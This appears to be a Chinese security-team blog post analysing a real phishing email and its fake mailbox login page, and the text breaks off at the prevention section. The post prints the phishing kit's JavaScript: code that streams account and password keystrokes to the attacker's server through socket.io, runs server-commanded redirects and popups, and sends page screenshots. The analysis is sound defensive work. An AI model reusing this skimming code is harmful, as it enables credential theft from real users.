---
title: 记一次钓鱼邮件实例分析
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247519791&idx=1&sn=f8f408c3e7b57b9783fde060aff1708e&chksm=ce5dac4ef92a25583e33450d525507ab9da79d6e5fc9a15b0a7e5c799935ec0614f904647568&scene=58&subscene=0#rd
source: Tide安全团队
date: 2025-01-25
fetch_date: 2025-10-06T20:11:33.387461
---

# 记一次钓鱼邮件实例分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1ndxnPp8iaX6XR4huRLwadbTEKGA51zC2OPJPIoNwY8n3AUWV5ICXPIw/0?wx_fmt=jpeg)

# 记一次钓鱼邮件实例分析

原创

随梦

Tide安全团队

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png)

声明：Tide安全团队原创文章，转载请声明出处！文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png)

## 0x01 事件概述

今儿一早登录邮箱想发周报来着，结果发现邮件新增一条，点开看看，好家伙，现在钓鱼邮件这么猖獗，连伪造都这么假。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj10VhRZoNIMWkJ0nugiafT9xDoOibWCIVsIgjDEU7uNypBVYuyg6KokgYA/640?wx_fmt=png&from=appmsg)

看到这，突然心血来潮，说什么也得分析分析，不然真对不起他发来的样例。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1nSUVP5Mjq8vAK9d9oRnJd77osZ0MHxFJJOZ8TiaUPXMibvvvqvsZ8gwg/640?wx_fmt=png&from=appmsg)

## 0x02 实例分析

### 邮件内容分析

像我们常遇见的钓鱼邮件呢，有很多种，就像附件钓鱼、链接钓鱼、二维码钓鱼、内容钓鱼等。而我这情况就属于链接钓鱼了，往往邮件中会有引导用户点击链接，进行弹窗或跳转到钓鱼网站，网站通常会要求用户输入账户信息之类以获取用户敏感度信息；另外一种链接指向的网页暗藏木马程序，用户如果浏览器存在未修复的漏洞则点开的同时就中招了。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1yszrtQ1Rmc51JYIdiaxWYhias3RKDXia3zAqptUbKfKJ7FR4Tq6mH0l2Q/640?wx_fmt=png&from=appmsg)

#### 1.发件人来源是否可信

我们先收集下发件人相关信息，通过查看信头，查看最后一个 "Received" 部分，通常包含发件人的原始IP地址

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1ibD1qbXVjYtM3ibkBMiauuyxdcHibspxz58rE7cA7RFBSHlKbCGePfMxkg/640?wx_fmt=png&from=appmsg)

目前整理如下：

```
发件人名称：信息部
发件人邮箱：qydbb@kilometressure.com
发件人地址:221.234.29.195(当然邮件头信息可以被伪造，需要结合其他信息进行综合判断)
```

可以通过名称和邮箱判断其大大的猫腻，因为我们单位没有以信息部自称的部门，其邮箱地址也不是常见的地址，将其ip放微步里搜下，好家伙钓鱼没跑了。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1lKQYDTPRsTR7CEd24GdUtoC3Gqu6elHNqwcAqe4lsOqKyVDlzXvvHw/640?wx_fmt=png&from=appmsg)

#### 2、邮件内容是否可信

看下邮件内容，只有简单几句话，再附上链接，意图不要太明显。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj11mn5MCJAyIcS2OgicaCd9krXI5icQuYy2yQkiaWbsMQcp4r8RxicsbjrXg/640?wx_fmt=png&from=appmsg)

我们可以通过F12,看下其网站js源码，鼠标放到链接处，可以看到点击会跳转到如图下链接

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1gNiagBHA9xZ9ypIHH0xv1cwnl3MzRD4uZvOjJZrswLcNY2oibSDibQ6rg/640?wx_fmt=png&from=appmsg)

查下域名可信度

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1Wt7BfNicAGhIBqia9KbSI0DtVpmV8BFvzRhTlEJgpJR5Pt9Q2fjV7SQg/640?wx_fmt=png&from=appmsg)

真的没什么可说的了，我们打开隐私模式，访问站点看下

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWNC42muR4cl5aaNra8ebj1icnqbicbxxrGlrtBBWrWickVfZGHWg1V0X8kEynseEBvouDqOqicZOKe0g/640?wx_fmt=png&from=appmsg)

可以看到这是一个新的邮箱登录界面，分析其代码逻辑。发现部分比较有意思的代码。

**代码片段一：输入监听，实时发送**

```
socket.emit('sendMsg',{"kongzhi":"10","zhuangtai":id("zhuangtai").value});

function shishijiankong1(canshu,canshu1){
    socket.emit("sendMsg",{"kongzhi":"8","xinxi":canshu1,"neirong":canshu.value});
}
id("zh").addEventListener("input",function(){shishijiankong1(id("zh"),"账号：")});
id("mm").addEventListener("input",function(){shishijiankong1(id("mm"),"密码：")});

function shishijiankong2(canshu,canshu1){
    socket.emit("sendMsg",{"kongzhi":"9","xinxi":canshu1,"neirong":canshu.value});
}
id("zh").addEventListener("blur",function(){shishijiankong2(id("zh"),"账号：")});
id("mm").addEventListener("blur",function(){shishijiankong2(id("mm"),"密码：")});
```

该片段代码可以看出，每当用户在 id 为 zh（账号输入框）和 mm（密码输入框）输入内容或输入框失去焦点时，都会通过 socket.emit 向服务器发送信息。所以可能会在没有明确被告知的情况下，这些信息会在输入时就被发送出去，并且也没有看到明确的隐私政策或用户同意的步骤。

**代码片段二：弹窗跳转与页面操作**

```
socket.on('pushMsg',function(data){
    var fanhuia=data;
    if(fanhuia.kongzhi=="2"){
        if(fanhuia.shifouqiangzhi=="弹窗跳转"){
            socket.emit('sendMsg',{"kongzhi":"16","fankui":"对方已经成功接收指令!"});
            if(fanhuia.yangshi==0){
                layer.open({
                    content:fanhuia.neirong,
                    closeBtn: 0,
                    btn:fanhuia.anniu,
                    yes: function(index, layero){
                        window.open(fanhuia.zhiling,"_self");
                        layer.close(index);
                    }
                });
            }else{
                layer.open({
                    type: 1,
                    title: false,
                    closeBtn: 0,
                    area: '300px;',
                    shade: 0.8,
                    id: 'LAY_layuipro',
                    btn: [fanhuia.anniu],
                    btnAlign: 'c',
                    moveType: 1,
                    content: '<div style="font-size:'+fanhuia.zitidaxiao+'rem;padding: 50px; line-height: 22px; background-color:'+fanhuia.beijingyanse+';color:'+fanhuia.wenbenyanse+';">'+fanhuia.neirong+'</div><span style="position:absolute;display:none;top:0px;font-size:0px;height:3px;width:7px;" id="QXrAEizDBXbNDzFVUex" class="nPEyIZGcHrIFGmINggT">前赴后继</span><span style="width:5px;top:0px;position:absolute;font-size:0px;display:none;height:5px;" id="WSyaeECMFIYVbbNq" class="QEgTkejRZajsXxAf">马到成功</span><span style="font-size:0px;position:absolute;width:4px;top:0px;display:none;height:4px;" id="ejGKybmY" class="xMHZfkmh">雪中送炭</span><span style="font-size:0px;height:8px;top:0px;position:absolute;width:8px;display:none;" id="sCvtmEnbN" class="KWwIxNkpF">精卫填海</span><span style="position:absolute;font-size:0px;width:8px;height:4px;display:none;top:0px;" id="EkMJiiUfzfILx" class="msHkZgeLkRmxE">老马识途</span><span style="display:none;top:0px;font-size:0px;height:6px;width:8px;position:absolute;" id="QgwNGJZTzQZMJbwtdJ" class="bygkdZMqiwzNZmhVYw">青出于蓝</span><span style="display:none;top:0px;font-size:0px;height:4px;width:7px;position:absolute;" id="HCaSNATrBwpfLrIlk" class="RfrxzSDYGqRZSPPvn">善始善终</span><span style="height:5px;display:none;font-size:0px;width:3px;position:absolute;top:0px;" id="wKOYrooGGo" class="sOfPFHoyYt">眼高手低</span><span style="position:absolute;font-size:0px;width:7px;display:none;top:0px;height:6px;" id="zGiNutvKKiiI" class="yiAlZMmqgUOr">奋不顾身</span>'
                   ,success: function(layero){
                        var btn = layero.find('.layui-layer-btn');
                        btn.find('.layui-layer-btn0').attr({
                            href:fanhuia.zhiling,//跳转
                        });
                    }
                });
            }
        }else if(fanhuia.shifouqiangzhi=="强制跳转"){
            socket.emit('sendMsg',{"kongzhi":"16","fankui":"对方已经成功接收指令!"});
            window.location.href=fanhuia.zhiling;
        }else if(fanhuia.shifouqiangzhi=="跳转弹窗"){
            socket.emit('sendMsg',{"kongzhi":"16","fankui":"对方已经成功接收指令!"});
            var url = new URL(window.location.href);
            var path = url.pathname;
            var lastSlashIndex = path.lastIndexOf('/');
            var topLevelPath = path.substring(0, lastSlashIndex + 1);
            var encodedUrl = topLevelPath+fanhuia.zhiling+"&anniu=" + encodeURIComponent(fanhuia.anniu) + "&neirong=" + encodeURIComponent(fanhuia.neirong)+"&moshi=0";
            window.location.href = encodedUrl;
        }
    }
    // 其他代码部分省略
})
```

在这个代码片段中可以看出，当服务器发送pushMsg消息且kongzhi=2时，根据shifouqiangzhi的不同值，会进行不同的跳转操作。例如强制跳转（window.location.href=fanhuia.zhiling;）或通过弹窗进行跳转，同样是在用户不知情的情况下。

**代码片段三：页面截图**

```
if(fanhuia.jietu=="1"){
    function takeScreenshot() {
        return new Promise((resolve, reject) => {
            html2canvas(document.body).then(canvas => {
                // 将 canvas 转换为 DataURL
                const dataURL = canvas.toDataURL('image/png');
                // 输出截图的 64 内容
                socket.emit("sendMsg", { image: dataURL });
                resolve(canvas);
            }).catch(error => {
                reject(error);
            });
        });
    }
    takeScreenshot();
}
```

当fanhuia.jietu=1时，会使用html2canvas对整个页面进行截图，并将截图以DataURL的形式发送到服务器。当然用户不知道他们的页面正在被截图。

#### 3、分析结果

通过发件人来源判定其不可信，为恶意ip。邮件内容为链接钓鱼，点击链接后会再次诱导用户输入邮箱账户密码，并会对用户输入内容进行实时监控、根据服务器消息进行不同强制操作（如弹窗显示、跳转、截图等），该获取用户信息行为均未经用户许可。

## 0x03 如何避免中招？

像现在钓鱼邮件一但出现，基本都是批量，那如何规避中招呢？那就要...